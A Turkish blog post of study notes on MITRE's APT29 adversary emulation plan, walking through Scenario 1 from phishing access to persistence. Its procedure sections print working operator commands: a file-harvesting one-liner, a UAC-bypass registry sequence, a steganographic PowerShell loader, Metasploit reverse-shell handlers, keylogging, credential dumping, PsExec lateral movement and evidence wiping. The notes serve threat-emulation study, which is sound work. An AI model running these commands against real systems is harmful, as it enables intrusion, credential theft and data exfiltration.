---
layout: post
title:  APT29 Adversary Emulation [Siber Güvenlik]
date:   2022-04-04 12:00:00 +0000
categories: cevizlab
---

Bu yazı, mitre-engenuity.org tarafından paylaşılan APT29 ATT&CK Evaluations içeriğinden aldığım notlardan oluşuyor. Orijinal kaynaklar şunlar:

+ [APT29 Enterprise Evaluation 2020](https://attackevals.mitre-engenuity.org/enterprise/apt29/)

+ [APT29 Adversary Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29)

---

## Neden?

**MITRE ATT&CK** bakınmam gerekti. Deniz derya... İçinde kaybolmamak ve saldırılara dair anlayışımı kuvvetlendirmesi için saldırı simülasyonlarını okumaya koyuldum. Okurken aldığım notlar bu yazıyı oluşturdu.

---
---

## APT29 Hakkında

APT29, Rus hükümetiyle ilintili ve en azından 2008'den beri faaliyet gösteren, 2015 yazından itibaren de Amerikan Demokratik Ulusal Komite'yi hedef alan bir tehdit grubu. Bunun yanında şu ülkelerde de operasyonları var: Almanya, Özbekistan, Güney Kore, Türkiye, Uganda, Polonya, Çeçenistan, Gürcistan, Kazakistan, Kırgızistan, Azerbaycan, Özbekistan, Çek Cumhuriyeti, Belçika, Portekiz, Romanya, İrlanda, Macaristan

---

## Öykünme (Emulation) Notları

APT29, saldırılarını özel derlenmiş ikili (binary) dosyalar, PowerShell ve WMI gibi alternatif yürütme yöntemleri aracılığıyla gerçekleştiren bir grup. Kendine has operasyonel kadansları var ve bunlar için özel araç setleri kullanıyor. Şu iki senaryo deseniyle tanınıyor: smash-and-grab, slow-and-deliberate

---

## Operasyonel Akış

APT29, halka açık uygulamalardan (exploiting public-facing applications) ([T1190](https://attack.mitre.org/techniques/T1190/)), oltalamayla (phishing) ([T1566.001](https://attack.mitre.org/techniques/T1566/001/),[T1566.002](https://attack.mitre.org/techniques/T1566/002/)) ve tedarik zinciri uzlaşmasından ([T1195](https://attack.mitre.org/techniques/T1195/)) yararlanarak ilk erişime ulaşıyor.

APT29 yaygın olarak şu iki senaryoyu uyguluyor:

1. Bu senaryo, kalıcılık (persistence), daha fazla veri toplama, kimlik bilgileri erişimi (credential access) ve yatay hareket (lateral movement) elde etmek için daha gizli tekniklere geçmeden önce, verileri toplamaya ve sızdırmaya (data gathering and exfiltrating) odaklanan bir "parçala ve kap (smash-and-grab)" ve ardından hızlı casusluk (rapid espionage) göreviyle başlar. Bu hızlı girişten elde edilen verilere bakıldığında, erişilen sistem değerli değilse hemen sıradakine geçilir. Kıymetli bir sisteme ulaştıklarında, ona özel araç seti o sisteme iletilir ve kalıcılık mekanizmaları işletilir.

2. Bu senaryo ise, ilk hedefi ele geçirip kalıcılık oluşturma, kimlik bilgilerini toplama (credential access) ardından son olarak tüm etki alanını numaralandırma (domain enumerating) ve ele geçirme için daha gizli ve yavaş bir yaklaşımdan oluşur. Senaryo, daha önce kurulmuş kalıcılık mekanizmalarının yürütüldüğü simüle edilmiş bir hızlandırma ile sona erer.

Görece ufak operasyonlar yaptıklarında ise operasyonlarına dair önceden yayınlanmış istihbarattan farklı olarak davranır ve özel araç seti kullanırlar. Bir çeşit doğaçlama...

![APT29 Attack Scenarios](/assets/img/apt29-attack-scenarios.jpg "APT29 Attack Scenarios")

---

## Senaryo 1

![APT29 ATT&CK Scenario 1](/assets/img/apt29-attack-scenario-1.jpg "APT29 ATT&CK Scenario 1")

### Özet

+ Senaryo genele yönelik oltalama üzerinden işleyen reverse shell payload ile başlar.
+ Hedefe karar vermeden önce "parçala ve yakala (smash-and-grab)" tarzında ilk erişilen hedeften hızlı veri toplama ve sızdırma ile sürer.
+ İlk erişilen sistem uzun vadeli istismar için daha gizli kötü amaçlı yazılımlar dağıtma amacıyla kullanılabilir.
+ PowerShell script'leri gibi modüler bileşenler atomik olarak çalıştırılabilir.

### Adım 1: İlk Erişim

Meşru kullanıcı, oltalama epostası ile gelen ve ekinde bulunan sıradan görünümlü ama içinde zararlı barındıran Word belgesini ([T1036](https://attack.mitre.org/versions/v6/techniques/T1036/) / [T1036.002](https://attack.mitre.org/techniques/T1036/)) çalıştırdığında ([T1204](https://attack.mitre.org/versions/v6/techniques/T1204/) / [T1204.002](https://attack.mitre.org/techniques/T1204/002/)), payload, genel olarak kullanılmayan 1234 portu üzerinden ([T1065](https://attack.mitre.org/versions/v6/techniques/T1065/)) C2 sunucusuna RC4 şifreli bir reverse shell bağlantısı iletir. Saldırgan daha sonra etkileşimli cmd.exe ([T1059](https://attack.mitre.org/versions/v6/techniques/T1059/) / [T1059.003](https://attack.mitre.org/techniques/T1059/003/)) ve powershell.exe ([T1086](https://attack.mitre.org/versions/v6/techniques/T1086/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/)) oluşturmak için etkin C2 bağlantısını kullanır.

İlk erişim için bazen de Right-to-Left Override karakteri (U+202E) kullanılarak imaj dosyası görünümlü çalıştırılabilir dosyalar oluşturulur ve meşru kullanıcının bunu imaj sanıp açması beklenir ([T1036.002](https://attack.mitre.org/techniques/T1036/002/)).

RTLO karakterini biraz daha açıklayalım: RTLO, onu takip eden metnin ters görüntülenmesine neden olan yazdırılamayan bir Unicode karakteri. Örneğin, "26 Mart \u202Excod.scr" adlı bir Windows ekran koruyucu yürütülebilir dosyası, "26 Mart rcs.docx" olarak görüntülenecektir. "photo_high_re\u202Egnp.js" adlı bir JavaScript dosyası "photo_high_resj.png" olarak görüntülenecektir. RTLO, Windows Kayıt Defteri'nde de kullanılabilir; burada regedit.exe ters karakterleri görüntüler ancak komut satırı aracı reg.exe varsayılan olarak göstermez.

**Prosedür:**

#### 1.1. User Execution: Malicious File ([T1204](https://attack.mitre.org/versions/v6/techniques/T1204/) / [T1204.002](https://attack.mitre.org/techniques/T1204/002/))

Meşru kullanıcı .doc uzantılı dosyaya çift tıkladığında, içindeki payload Pupy C2 sunucusuna bir reverse shell gönderir.

#### 1.2. Command and Scripting Interpreter: PowerShell ([T1086](https://attack.mitre.org/versions/v6/techniques/T1086/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/))

Payload'un reverse shell üzerinden erişim sağladığı C2 sunucusu önce CMD, CMD içinden de PowerShell alır.

İlk erişimden itibaren alınan ve gönderilen tüm veri RC4'le şifrelenir.

[pupy] > `shell`

[pupy (CMD)] > `powershell`

### Adım 2: Hızlı Toplama ve Sızdırma

Saldırgan, dosya sisteminde belge ve medya dosyaları aramak ([T1083](https://attack.mitre.org/techniques/T1083/), [T1119](https://attack.mitre.org/techniques/T1119/)), içeriği toplamak ([T1005](https://attack.mitre.org/techniques/T1005/)) ve sıkıştırmak ([T1002](https://attack.mitre.org/versions/v6/techniques/T1002/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/)) için tek satırlık bir komut çalıştırır. Dosya daha sonra mevcut C2 bağlantısı ([T1041](https://attack.mitre.org/techniques/T1041/)) üzerinden dışa aktarılır.

**Prosedür:**

#### 2.1. Collection ([T1119](https://attack.mitre.org/techniques/T1119/), [T1005](https://attack.mitre.org/techniques/T1005/), [T1002](https://attack.mitre.org/versions/v6/techniques/T1002/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/))

[pupy (PowerShell)] >

```powershell
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
```

[pupy (PowerShell)] > `exit`

[pupy (CMD)] > `exit`

#### 2.2. Exfiltration Over C2 Channel ([T1041](https://attack.mitre.org/techniques/T1041/))

Oluşturulan .zip dosyası `download "C:\Users\<username>\AppData\Roaming\Draft.Zip" .` komutuyla C2 tarafına çekilir.

[pupy] > `download "C:\Users\<username>\AppData\Roaming\Draft.Zip" .`

### Adım 3: Gizli Araç Kitini Dağıtma

Bundan sonra saldırgan kurbana yeni bir payload ([T1105](https://attack.mitre.org/techniques/T1105/)) yükler. Payload, gizli bir PowerShell komut dosyasına ([T1027](https://attack.mitre.org/versions/v6/techniques/T1027/) / [T1027.003](https://attack.mitre.org/techniques/T1027/003/)) sahip yasal olarak oluşturulmuş bir görüntü dosyasıdır. Saldırgan daha sonra, yeni eklenen payload'u yürüten bir kullanıcı hesabı denetimi (UAC) atlaması ([T1122](https://attack.mitre.org/versions/v6/techniques/T1122/) / [T1546.015](https://attack.mitre.org/techniques/T1546/015/), [T1088](https://attack.mitre.org/versions/v6/techniques/T1088/) / [T1548.002](https://attack.mitre.org/techniques/T1548/002/)) aracılığıyla ayrıcalıkları yükseltir. HTTPS protokolü kullanılarak 443 numaralı port üzerinden ([T1043](https://attack.mitre.org/versions/v6/techniques/T1043/)) yeni bir C2 bağlantısı kurulur ([T1071](https://attack.mitre.org/versions/v6/techniques/T1071/) / [T1071.001](https://attack.mitre.org/techniques/T1071/001/), [T1032](https://attack.mitre.org/versions/v6/techniques/T1032/) / [T1573](https://attack.mitre.org/techniques/T1573/)). Son olarak, saldırgan, ayrıcalık yükseltmesinin izlerini Registry'den kaldırır ([T1112](https://attack.mitre.org/techniques/T1112/)).

**Prosedür:**

#### 3.1. Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))

Saldırgan Metasploit handler'ı başlatır:

[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`

Pupy üzerinden, monkey.png dosyası hedefe yüklenir:

[pupy] > `upload "/tmp/monkey.png" "C:\Users\<username>\Downloads\monkey.png"`

[pupy] > `shell`

[pupy (CMD)] > `powershell`

#### 3.2. Abuse Elevation Control Mechanism: Bypass User Access Control ([T1088](https://attack.mitre.org/versions/v6/techniques/T1088/) / [T1548.002](https://attack.mitre.org/techniques/T1548/002/))

[pupy (PowerShell)] >

```powershell
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)"
```

Prompt giriş beklediğinde saldırgan, aşağıdaki 1-liner'ı yazar:

```powershell
powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\username\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
```

[pupy (PowerShell)] >

```powershell
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Force
```

Prompt giriş beklediğinde saldırgan Enter'a basar:

[pupy (PowerShell)] > `exit`

[pupy (CMD)] > `%windir%\system32\sdclt.exe`

[pupy CMD] > `powershell`

Bundan sonra saldırgana Meterpreter çağrısı erişir.

#### 3.3. Modify Registry ([T1112](https://attack.mitre.org/techniques/T1112/))

Saldırgan Registry'i düzenler.

[pupy (PowerShell)] > `Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force`

[pupy (PowerShell)] > `exit`

[pupy (CMD)] > `exit`

### Adım 4: Savunmayı Atlatma ve Keşif

Saldırgan, etkileşimli bir powershell.exe kabuğu ([T1086](https://attack.mitre.org/versions/v6/techniques/T1086/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/)) oluşturmadan önce yeni, yükseltilmiş erişim aracılığıyla ek araçlar ([T1105](https://attack.mitre.org/techniques/T1105/)) yükler. Ek araçlar sıkıştırılır ([T1140](https://attack.mitre.org/techniques/T1140/)) ve kullanım için hedef üzerine yerleştirilir. Saldırgan daha sonra, bu erişimle ilişkili çeşitli dosyaları ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/)) silmeden önce Adım 1'deki ilk erişimi keşfetmek/sonlandırmak için çalışan süreçleri ([T1057](https://attack.mitre.org/techniques/T1057/)) sıralar. Son olarak, saldırgan, bazıları Windows API'sine ([T1106](https://attack.mitre.org/techniques/T1106/)) erişerek yapılan çok çeşitli keşif komutları ([T1016](https://attack.mitre.org/techniques/T1016/), [T1033](https://attack.mitre.org/techniques/T1033/), [T1063](https://attack.mitre.org/versions/v6/techniques/T1063/) / [T1518.001](https://attack.mitre.org/techniques/T1518/001/), [T1069](https://attack.mitre.org/techniques/T1069/), [T1082](https://attack.mitre.org/techniques/T1082/), [T1083](https://attack.mitre.org/techniques/T1083/)) gerçekleştiren bir PowerShell betiği başlatır.

**Prosedür:**

#### 4.1. Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))

Saldırgan Metasploit içinden SysinternalsSuite.zip dosyasını hedefe iletir ve açar:

[msf] > `sessions`

[msf] > `sessions -i 1`

[meterpreter\*] >

```powershell
upload SysinternalsSuite.zip "C:\\Users\\username\\Downloads\\SysinternalsSuite.zip"
```

[meterpreter\*] > `execute -f powershell.exe -i -H`

[meterpreter (PowerShell)\*] >

```powershell
Expand-Archive -LiteralPath "$env:USERPROFILE\Downloads\SysinternalsSuite.zip" -DestinationPath "$env:USERPROFILE\Downloads\"
```

[meterpreter (PowerShell)\*] >

```powershell
if (-Not (Test-Path -Path "C:\Program Files\SysinternalsSuite")) { Move-Item -Path $env:USERPROFILE\Downloads\SysinternalsSuite -Destination "C:\Program Files\SysinternalsSuite" }
```

[meterpreter (PowerShell)\*] > `cd "C:\Program Files\SysinternalsSuite\"`

#### 4.2. Indicator Removal on Host: File Deletion ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/))

İlk erişim ardından çalıştırdığı Pupy RAT process'ini sonlandırır:

[meterpreter (PowerShell)\*] > `Get-Process`

[meterpreter (PowerShell)\*] > `Stop-Process -Id <rcs.3aka3.doc PID> -Force`

Artık Pupy kapatılabilir. Metasploit üzerinden:

[meterpreter (PowerShell)\*] > `Gci $env:userprofile\Desktop`

[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\?rcs.3aka.doc"`

[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip"`

[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysinternalsSuite.zip"`

Özel yapım PS script'ini dahil eder ve çalıştırır:

[meterpreter (PowerShell)\*] > `Move-Item .\readme.txt readme.ps1`

[meterpreter (PowerShell)\*] > `. .\readme.ps1`

#### 4.3. Discovery ([T1016](https://attack.mitre.org/techniques/T1016/), [T1033](https://attack.mitre.org/techniques/T1033/), [T1063](https://attack.mitre.org/versions/v6/techniques/T1063/) / [T1518.001](https://attack.mitre.org/techniques/T1518/001/), [T1069](https://attack.mitre.org/techniques/T1069/), [T1082](https://attack.mitre.org/techniques/T1082/), [T1083](https://attack.mitre.org/techniques/T1083/))

[meterpreter (PowerShell)\*] > `Invoke-Discovery`

### Adım 5: Kalıcılık

Saldırgan, yeni bir servis oluşturarak ([T1031](https://attack.mitre.org/versions/v6/techniques/T1031/) / [T1543.003](https://attack.mitre.org/techniques/T1543/003/)) ve Windows Başlangıç klasöründe ([T1060](https://attack.mitre.org/versions/v6/techniques/T1060/) / [T1547.001](https://attack.mitre.org/techniques/T1547/001/)) kötü niyetli bir payload oluşturarak kurbana kalıcı erişim için iki farklı yol kurar.

**Prosedür:**

#### 5.1. Create or Modify System Process: Windows Service ([T1031](https://attack.mitre.org/versions/v6/techniques/T1031/) / [T1543.003](https://attack.mitre.org/techniques/T1543/003/))

[meterpreter (PowerShell)\*] > `Invoke-Persistence -PersistStep 1`

#### 5.2. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder ([T1060](https://attack.mitre.org/versions/v6/techniques/T1060/) / [T1547.001](https://attack.mitre.org/techniques/T1547/001/))

[meterpreter (PowerShell)\*] > `Invoke-Persistence -PersistStep 2`

### Adım 6: Kimlik Bilgileri Erişimi

Saldırgan, yerel bir web tarayıcısında ([T1081](https://attack.mitre.org/versions/v6/techniques/T1081/) / [T1552.001](https://attack.mitre.org/techniques/T1552/001/), [T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1555.003](https://attack.mitre.org/techniques/T1555/003/)) saklanan kimlik bilgilerine, meşru bir yardımcı program gibi görünmek üzere yeniden adlandırılan bir araç ([T1036](https://attack.mitre.org/versions/v6/techniques/T1036/) / [T1036.005](https://attack.mitre.org/techniques/T1036/005)) kullanarak erişir. Saldırgan daha sonra özel anahtarları (private key) ([T1145](https://attack.mitre.org/versions/v6/techniques/T1145/) / [T1552.004](https://attack.mitre.org/techniques/T1552/004/)) ve parola hash'lerini ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1003.002](https://attack.mitre.org/techniques/T1003/002/)) toplar.

**Prosedür:**

#### 6.1. Credentials from Password Stores: Credentials from Web Browsers ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1555.003](https://attack.mitre.org/techniques/T1555/003/))

Saldırgan Chrome parola toplayıcısını çalıştırır:

[meterpreter (PowerShell)\*] > `& "C:\Program Files\SysinternalsSuite\accesschk.exe"`

#### 6.2. Unsecured Credentials: Private Keys ([T1145](https://attack.mitre.org/versions/v6/techniques/T1145/) / [T1552.004](https://attack.mitre.org/techniques/T1552/004/))

PFX formatı, sertifikaların binary formatındaki hali. Bu formatta privatekey, alt kök sertifika ve SSL sertifikası kombine olarak bulunabilir. Dosya uzantıları .pfx veya .p12 dir. PFX dosyaları genelde Windows tabanlı sistemlerde sertifikaları ve privatekey leri göndermek veya almak için kullanılır.

Saldırgan PFX sertifikalarını çalar:

[meterpreter (PowerShell)\*] > `Get-PrivateKeys`

[meterpreter (PowerShell)\*] > `exit`

#### 6.3. OS Credential Dumping: Security Account Manager ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1003.002](https://attack.mitre.org/techniques/T1003/002/))

Parola hash dump'ı alır:

[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`

### Adım 7: Toplama ve Sızdırma

Saldırgan, ekran görüntülerini ([T1113](https://attack.mitre.org/techniques/T1113/)), kullanıcının panosundaki verileri ([T1115](https://attack.mitre.org/techniques/T1115/)) ve tuş vuruşlarını ([T1056](https://attack.mitre.org/versions/v6/techniques/T1056/) / [T1056.001](https://attack.mitre.org/techniques/T1056/001/)) toplar. Ardından saldırgan tarafından kontrol edilen bir WebDAV paylaşımına ([T1048](https://attack.mitre.org/versions/v6/techniques/T1048/) / [T1048](https://attack.mitre.org/techniques/T1048/003)) sızdırmadan önce sıkıştırılmış ve şifrelenmiş ([T1560](https://attack.mitre.org/versions/v6/techniques/T1560/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/)) dosyaları toplar ([T1005](https://attack.mitre.org/techniques/T1005/)).

**Prosedür:**

#### 7.A - User Monitoring ([T1113](https://attack.mitre.org/techniques/T1113/), [T1115](https://attack.mitre.org/techniques/T1115/), [T1056](https://attack.mitre.org/versions/v6/techniques/T1056/) / [T1056.001](https://attack.mitre.org/techniques/T1056/001/))

[meterpreter\*] > `execute -f powershell.exe -i -H`

[meterpreter (PowerShell)\*] > `cd "C:\Program Files\SysinternalsSuite"`

[meterpreter (PowerShell)\*] > `Move-Item .\psversion.txt psversion.ps1`

[meterpreter (PowerShell)\*] > `. .\psversion.ps1`

[meterpreter (PowerShell)\*] > `Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName "Screenshot"`

[meterpreter (PowerShell)\*] > `Get-Clipboard`

[meterpreter (PowerShell)\*] > `Keystroke-Check`

[meterpreter (PowerShell)\*] > `Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes"`

[meterpreter (PowerShell)\*] > `View-Job -JobName "Keystrokes"`

[meterpreter (PowerShell)\*] > `Remove-Job -Name "Keystrokes" -Force`

[meterpreter (PowerShell)\*] > `Remove-Job -Name "Screenshot" -Force`

#### 7.B - Compression and Exfiltration ([T1048](https://attack.mitre.org/techniques/T1048/), [T1002](https://attack.mitre.org/versions/v6/techniques/T1002/), [T1022](https://attack.mitre.org/versions/v6/techniques/T1022/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/))

[meterpreter (PowerShell)\*] > `Invoke-Exfil`

### Adım 8: Yanal Hareket

Saldırgan, diğer bir sistemde ([T1021](https://attack.mitre.org/versions/v6/techniques/T1021/) / [T1021.006](https://attack.mitre.org/techniques/T1021/006/)) uzak bir PowerShell oturumu oluşturmadan önce domaindeki ([T1018](https://attack.mitre.org/techniques/T1018/)) diğer bilgisayarları numaralandırmak (enumerate) için Lightweight Directory Access Protocol (LDAP) sorgularını kullanır. Saldırgan bu bağlantı aracılığıyla çalışan process'leri sıralar ([T1057](https://attack.mitre.org/techniques/T1057/)). Ardından, saldırgan ikincil kurbana yeni bir UPX paketli payload ([T1027](https://attack.mitre.org/versions/v6/techniques/T1027/) / [T1027.002](https://attack.mitre.org/techniques/T1027/002/)) yükler ([T1105](https://attack.mitre.org/techniques/T1105/)). Bu yeni payload, daha önce çalınan kimlik bilgileri ([T1078](https://attack.mitre.org/versions/v6/techniques/T1078/) / [T1078.002](https://attack.mitre.org/techniques/T1078/002)) kullanılarak PSExec yardımcı programı ([T1021](https://attack.mitre.org/versions/v6/techniques/T1021/) / [T1021.002](https://attack.mitre.org/techniques/T1021/002/), [T1035](https://attack.mitre.org/versions/v6/techniques/T1035/) / [T1569.002](https://attack.mitre.org/techniques/T1569/002/)) aracılığıyla ikincil kurban üzerinde yürütülür.

**Prosedür:**

#### 8.1. Remote Services: Windows Remote Management ([T1021](https://attack.mitre.org/versions/v6/techniques/T1021/) / [T1021.006](https://attack.mitre.org/techniques/T1021/006/))

Payload WebDav paylaşımına:

[user@attacker]\# `cp attack-evals/apt29/day1/payloads/python.exe /var/www/webdav/`

[user@attacker]\# `cd /var/www/webdav`

[user@attacker]\# `chown -R www-data:www-data python.exe`

Meterpreter shell'ine dön:

[meterpreter (PowerShell)\*] > `Ad-Search Computer Name *`

[meterpreter (PowerShell)\*] >

```powershell
Invoke-Command -ComputerName <victim 2 IP> -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId
```

Adım 8.3. için Session ID'yi kaydet!

#### 8.2. Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))

Yeni bir Metasploit başlat ve Handler hazırla:

[bash] > `msfconsole`

[msf] > `handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https`

Hazırdaki Meterpreter oturumuna dön:

[meterpreter (PowerShell)\*] > `Invoke-SeaDukeStage -ComputerName <victim 2 IP>`

#### 8.3. System Services: Service Execution ([T1035](https://attack.mitre.org/versions/v6/techniques/T1035/) / [T1569.002](https://attack.mitre.org/techniques/T1569/002/))

**PSEXEC üzerinden remote olarak SEADUKE çalıştır.**

[meterpreter (PowerShell)\*] >

```powershell
.\PsExec64.exe -accepteula \\<victim 2 IP> -u "domainName\username" -p P@ssw0rd -i <session ID from 8A> "C:\Windows\Temp\python.exe"
```

Yeni Metasploit terminaline bağlantı gelir.

### Adım 9: Toplama

Saldırgan, belge ve medya dosyaları ([T1083](https://attack.mitre.org/techniques/T1083/), [T1119](https://attack.mitre.org/techniques/T1119/)) için dosya sistemini aramak için bir PowerShell tek satırlı komutu ([T1059](https://attack.mitre.org/versions/v6/techniques/T1059/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/)) çalıştırmadan önce ikincil kurbana ([T1105](https://attack.mitre.org/techniques/T1105/)) ek yardımcı programlar yükler. İlgili dosyalar toplanır ([T1005](https://attack.mitre.org/techniques/T1005/)), ardından tek bir dosyaya ([T1074](https://attack.mitre.org/versions/v6/techniques/T1074/) / [T1074.001](https://attack.mitre.org/techniques/T1074/001/)) şifrelenir ve sıkıştırılır ([T1002](https://attack.mitre.org/versions/v6/techniques/T1002/), [T1022](https://attack.mitre.org/versions/v6/techniques/T1022/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/).Bu dosya daha sonra mevcut C2 bağlantısı üzerinden sızar ([T1041](https://attack.mitre.org/techniques/T1041/)). Son olarak, saldırgan bu erişimle ilişkili çeşitli dosyaları ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/)) siler.

**Prosedür:**

#### 9.1. Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))

İkinci Metasploit terminalinden:

[msf] > `sessions`

[msf] > `sessions -i 1`

[meterpreter\*] >

```cmd
upload "/home/gfawkes/Round2/Day1/payloads/r2d1/Seaduke/rar.exe" "C:\\Windows\\Temp\\Rar.exe"
```

[meterpreter\*] >

```cmd
upload "sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"
```

#### 9.2. Collection and Exfiltration ([T1005](https://attack.mitre.org/techniques/T1005/), [T1041](https://attack.mitre.org/techniques/T1041/), [T1002](https://attack.mitre.org/versions/v6/techniques/T1002/),  [T1022](https://attack.mitre.org/versions/v6/techniques/T1022/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/))

[meterpreter\*] > `execute -f powershell.exe -i -H`

[meterpreter (PowerShell)\*] >

```powershell
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force
```

[meterpreter (PowerShell)\*] > `cd C:\Windows\Temp`

[meterpreter (PowerShell)\*] > `.\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip"`

[meterpreter (PowerShell)\*] > `exit`

[meterpreter\*] > `download "C:\\Users\\<username>\\Desktop\\working.zip" .`

#### 9.3. Indicator Removal on Host: File Deletion ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/))

[meterpreter\*] > `shell`

[meterpreter (Shell)\*] > `cd "C:\Windows\Temp"`

[meterpreter (Shell)\*] > `.\sdelete64.exe /accepteula "C:\Windows\Temp\Rar.exe"`

[meterpreter (Shell)\*] > `.\sdelete64.exe /accepteula "C:\Users\<username>\AppData\Roaming\working.zip"`

[meterpreter (Shell)\*] > `.\sdelete64.exe /accepteula "C:\Users\<username>\Desktop\working.zip"`

[meterpreter (Shell)\*] > `del "C:\Windows\Temp\sdelete64.exe"`

**Oturum sonlandırılır.**

[meterpreter (Shell)\*] > `exit`

[meterpreter\*] > `exit`

msf> `exit`


### Adım 10: Kalıcılık Yürütme

İlk kurban farklı bir zamanda sistemini yeniden açtığında bu aktivite, yeni hizmetin ([T1035](https://attack.mitre.org/versions/v6/techniques/T1035/) / [T1569.002](https://attack.mitre.org/techniques/T1569/002/)) ve Windows Başlangıç klasöründeki ([T1060](https://attack.mitre.org/versions/v6/techniques/T1060/) / [T1547.001](https://attack.mitre.org/techniques/T1547/001/)) payload'un yürütülmesi gibi önceden kurulmuş kalıcılık mekanizmalarını tetikler. Başlangıç klasöründeki payload, çalınan bir token ([T1106](https://attack.mitre.org/techniques/T1106/), [T1134](https://attack.mitre.org/versions/v6/techniques/T1134/) / [T1134.002](https://attack.mitre.org/techniques/T1134/002)) kullanarak bir sonraki payload'u yürütür.

**Prosedür:**

#### 10.1. System Services: Service Execution ([T1035](https://attack.mitre.org/versions/v6/techniques/T1035/) / [T1569.002](https://attack.mitre.org/techniques/T1569/002/))

#### 10.2. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder ([T1060](https://attack.mitre.org/versions/v6/techniques/T1060/) / [T1547.001](https://attack.mitre.org/techniques/T1547/001/))

---

## Senaryo 2

Diğer senaryo da bu lakin buraya kadar olan kısımla yetinip şimdilik duruyorum. Fırsat buldukça MITRE ATT&CK Framework okuyup ATP analiz etmeye devam edeceğim. Çok şey öğretiyor.

![APT29 ATT&CK Scenario 2](/assets/img/apt29-attack-scenario-2.jpg "APT29 ATT&CK Scenario 2")
